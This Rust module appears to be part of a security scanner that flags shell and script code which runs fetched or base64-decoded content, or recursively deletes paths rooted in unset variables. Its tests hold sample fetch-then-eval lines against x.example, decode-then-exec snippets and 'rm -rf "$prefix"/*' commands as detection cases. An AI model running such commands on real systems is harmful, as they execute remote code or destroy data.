//! Following a value from where it is made to where it is run, across the
//! lines of one file: a shell variable set to what a fetch or a decoder
//! produced and later handed to a shell, and, in Python, JavaScript or
//! Lua, a variable set to a decode call and then given to `exec`/`eval`.
//!
//! The whole-file, textual tracking of fetched *files* lives in
//! `review::apply_rules`; this is the same idea for fetched and decoded
//! *content* held in a variable.

use super::shell::{self, Command, program_name, unquoted_words};
use super::{RuleId, encoded, fetch};

/// Where a tracked value came from.
#[derive(Clone, Copy, PartialEq, Eq)]
enum Source {
    Fetched,
    Decoded,
}

impl Source {
    const fn rule(self) -> RuleId {
        match self {
            Self::Fetched => RuleId::DownloadAndExecute,
            Self::Decoded => RuleId::EncodedCommandExecution,
        }
    }
}

/// The most variables tracked through one file.
const MAX_TRACKED: usize = 64;

/// How many lines after a decode assignment a run of it still counts, for
/// the code (non-shell) shapes where the two are usually adjacent.
const CODE_REACH: usize = 3;

/// Whether `value` is content brought in from the network: a fetch
/// substitution, a backtick fetch, or a `< <(curl …)` on the statement.
fn fetched_value(statement: &str, value: &str) -> bool {
    (value.starts_with("$(") || value.starts_with('`')) && fetch::text_fetches(value)
        || (statement.contains("< <(") && fetch::text_fetches(statement))
}

/// Whether `value` is content a decoder produced.
fn decoded_value(value: &str) -> bool {
    (value.starts_with("$(") || value.starts_with('`'))
        && (encoded::has_decoder(value) || value.contains("base64 -d"))
}

/// Whether a command runs the shell variable `name`: `eval "$x"`,
/// `bash -c "$x"`, a here-string `sh <<< "$x"`, or printed into a shell
/// (`echo "$x" | sh`, `printf %s "$x" | bash`).
fn runs_variable(line: &str, name: &str) -> bool {
    let references = |command: &Command| {
        command
            .arguments
            .iter()
            .any(|word| shell::is_reference(word, name))
    };
    for statement in shell::statements(line) {
        let parts = shell::pipeline(statement);
        for (at, part) in parts.iter().enumerate() {
            let Some(command) = shell::command(part) else {
                continue;
            };
            // `eval "$x"`, `sh -c "$x"`.
            if (command.program == "eval" || (command.is_shell() && command.has_short('c')))
                && references(&command)
            {
                return true;
            }
            // `sh <<< "$x"`.
            if command.is_shell() && part.contains("<<<") {
                let after = part.split("<<<").nth(1).unwrap_or_default();
                if shell::command(after).is_some_and(|rest| {
                    rest.operands()
                        .next()
                        .is_some_and(|word| shell::is_reference(word, name))
                }) || after.trim().trim_matches(['"', '\'']).trim() == format!("${name}")
                    || shell::is_reference(after.trim(), name)
                {
                    return true;
                }
            }
            // `echo "$x" | sh`, `printf %s "$x" | bash`.
            if matches!(command.program.as_str(), "echo" | "printf")
                && references(&command)
                && parts[at + 1..]
                    .iter()
                    .any(|next| shell::command(next).is_some_and(|command| command.is_shell()))
            {
                return true;
            }
        }
    }
    false
}

/// The findings from following values through `lines` (each lowercased,
/// comments blanked): a run of a variable that holds fetched or decoded
/// content, as (line number, rule).
pub(crate) fn findings(lines: &[String]) -> Vec<(usize, RuleId)> {
    let mut found = Vec::new();
    // Shell variables holding fetched or decoded content.
    let mut held: Vec<(String, Source)> = Vec::new();
    // Code variables holding a decode call, with the line they were set.
    let mut decoded: Vec<(String, usize)> = Vec::new();
    for (index, line) in lines.iter().enumerate() {
        for statement in shell::statements(line) {
            for (name, value) in shell::assignments(statement) {
                let source = if fetched_value(statement, &value) {
                    Some(Source::Fetched)
                } else if decoded_value(&value) {
                    Some(Source::Decoded)
                } else {
                    None
                };
                if let Some(source) = source {
                    held.retain(|(known, _)| *known != name);
                    held.push((name, source));
                    if held.len() > MAX_TRACKED {
                        held.remove(0);
                    }
                }
            }
        }
        // `read -r x < <(curl …)`: the names are read, not assigned, and
        // the fetch sits in the process substitution the redirection reads.
        if line.contains("< <(") && fetch::text_fetches(line) {
            let before = line.split('<').next().unwrap_or_default();
            if let Some(command) = shell::command(before)
                && command.program == "read"
            {
                for name in command.operands() {
                    held.push((name.to_string(), Source::Fetched));
                }
            }
        }
        for (name, source) in &held {
            if runs_variable(line, name) {
                found.push((index + 1, source.rule()));
            }
        }

        // The code shapes: a decode assigned, then run within a few lines.
        if let Some(name) = encoded::assigned_decode(line) {
            decoded.push((name.to_string(), index));
            if decoded.len() > MAX_TRACKED {
                decoded.remove(0);
            }
        }
        for (name, set) in &decoded {
            if index > *set && index - *set <= CODE_REACH && encoded::runs_name(line, name) {
                found.push((index + 1, RuleId::EncodedCommandExecution));
            }
        }
    }
    found.extend(unset_variable_removals(lines));
    found
}

/// Variables a shell gives a build without a script setting them, so an
/// `rm -rf "$VAR"/...` of one empties the whole disk when it is unset.
const PROVIDED_VARIABLES: &[&str] = &["pkgdir", "srcdir", "startdir", "builddir"];

/// `rm -rf "$VAR"/...` where `VAR` is set nowhere in the file, or only
/// from a command substitution, and nothing guards it: no `set -u`, no
/// `${VAR:?}`, and it is not one of the directories a build is handed.
fn unset_variable_removals(lines: &[String]) -> Vec<(usize, RuleId)> {
    // A script that stops on an unset variable cannot reach the empty case.
    if lines.iter().any(|line| {
        let line = line.trim();
        ["set -u", "set -eu", "set -ue", "set -o nounset"]
            .iter()
            .any(|guard| line == *guard || line.starts_with(&format!("{guard} ")))
    }) {
        return Vec::new();
    }
    // Variables that cannot be empty when the script runs: set to a plain
    // value, or to the script's own `mktemp` path.
    let mut safe: std::collections::HashSet<String> = std::collections::HashSet::new();
    for line in lines {
        for statement in shell::statements(line) {
            for (name, value) in shell::assignments(statement) {
                let command_output = value.starts_with("$(") || value.starts_with('`');
                if value.contains("mktemp") || !command_output {
                    safe.insert(name);
                }
            }
        }
    }
    // Dangerous when it is not a provided build directory and is never
    // set to a non-empty value (so it is unset, or only a command's output).
    let empty_when_unset = |name: &str| !PROVIDED_VARIABLES.contains(&name) && !safe.contains(name);
    let mut found = Vec::new();
    for (index, line) in lines.iter().enumerate() {
        for statement in shell::statements(line) {
            if !is_recursive_rm(statement) {
                continue;
            }
            for word in unquoted_words(statement) {
                if let Some(name) = removal_target_variable(&word)
                    && empty_when_unset(&name)
                {
                    found.push((index + 1, RuleId::DestructiveSystemOperation));
                }
            }
        }
    }
    found
}

/// Whether a statement is a recursive `rm`.
fn is_recursive_rm(statement: &str) -> bool {
    let Some(command) = shell::command(statement) else {
        return false;
    };
    program_name(&command.program) == "rm"
        && (command.has_short('r') || command.arguments.iter().any(|word| word == "--recursive"))
}

/// The variable a removal target is rooted at, when the target deletes
/// everything under it (`"$VAR"/*`, `$VAR/`, `"${VAR}"/`). A `${VAR:?}`
/// guard, or anything before the variable, means it is not this shape.
fn removal_target_variable(word: &str) -> Option<String> {
    let trimmed = word.trim_matches(['"', '\'']);
    let core = trimmed
        .strip_suffix("/*")
        .or_else(|| trimmed.strip_suffix('/'))?;
    let name = core
        .strip_prefix("${")
        .and_then(|rest| rest.strip_suffix('}'))
        .or_else(|| core.strip_prefix('$'))?;
    (shell::is_name(name)).then(|| name.to_string())
}

#[cfg(test)]
mod tests {
    use super::super::RuleId;
    use super::findings;

    fn run(text: &str) -> Vec<(usize, RuleId)> {
        let lines: Vec<String> = text.lines().map(str::to_lowercase).collect();
        findings(&lines)
    }

    #[test]
    fn a_fetched_variable_run_later_is_download_and_execute() {
        for text in [
            "x=$(curl -fssl https://x.example/i)\neval \"$x\"\n",
            "x=`wget -qo- https://x.example/i`\nbash -c \"$x\"\n",
            "payload=$(curl -s https://x.example/i)\nsh <<< \"$payload\"\n",
            "p=$(curl -s https://x.example/i)\necho \"$p\" | sh\n",
            "p=$(curl -s https://x.example/i)\nprintf %s \"$p\" | bash\n",
            "read -r cmd < <(curl -s https://x.example/i)\neval \"$cmd\"\n",
        ] {
            let found = run(text);
            assert!(
                found
                    .iter()
                    .any(|(_, rule)| *rule == RuleId::DownloadAndExecute),
                "{text:?} -> {found:?}"
            );
        }
        for text in [
            "x=$(curl -s https://x.example/v)\necho \"version $x\"\n",
            "x=$(curl -s https://x.example/v)\ntest -n \"$x\"\n",
            "x=$(date)\neval \"$x\"\n",
            "x=$(curl -s https://x.example/v)\ny=$x\n",
        ] {
            assert!(run(text).is_empty(), "{text:?} -> {:?}", run(text));
        }
    }

    #[test]
    fn rm_of_an_unset_variable_path_is_destructive() {
        for text in [
            "rm -rf \"$prefix\"/*\n",
            "rm -rf $dest/\n",
            "rm -rf \"${target}\"/\n",
            "out=$(find . -type d)\nrm -rf \"$out\"/*\n",
        ] {
            let found = run(text);
            assert!(
                found
                    .iter()
                    .any(|(_, rule)| *rule == RuleId::DestructiveSystemOperation),
                "{text:?} -> {found:?}"
            );
        }
        for text in [
            // Assigned a literal, guarded, a build directory, or set -u.
            "prefix=/opt/x\nrm -rf \"$prefix\"/*\n",
            "rm -rf \"${prefix:?}\"/*\n",
            "rm -rf \"$pkgdir\"/*\n",
            "rm -rf \"$srcdir\"/build\n",
            "tmp=$(mktemp -d)\nrm -rf \"$tmp\"/*\n",
            "set -eu\nrm -rf \"$prefix\"/*\n",
            "rm -rf \"$prefix\"\n",
            "rm -rf build/\n",
        ] {
            assert!(run(text).is_empty(), "{text:?} -> {:?}", run(text));
        }
    }

    #[test]
    fn a_decoded_variable_run_is_encoded_execution() {
        for text in [
            "d=$(echo ywjj | base64 -d)\neval \"$d\"\n",
            "code = base64.b64decode(blob)\nexec(code)\n",
            "src = zlib.decompress(blob)\nx = 1\nexec(src)\n",
            "local s = string.char(112, 114)\nload(s)()\n",
            "const js = atob(blob)\neval(js)\n",
        ] {
            let found = run(text);
            assert!(
                found
                    .iter()
                    .any(|(_, rule)| *rule == RuleId::EncodedCommandExecution),
                "{text:?} -> {found:?}"
            );
        }
        for text in [
            "code = base64.b64decode(blob)\nreturn code\n",
            // Too far apart.
            "code = base64.b64decode(blob)\na\nb\nc\nd\nexec(code)\n",
            "data = zlib.decompress(blob)\nsink(data)\n",
        ] {
            assert!(run(text).is_empty(), "{text:?} -> {:?}", run(text));
        }
    }
}
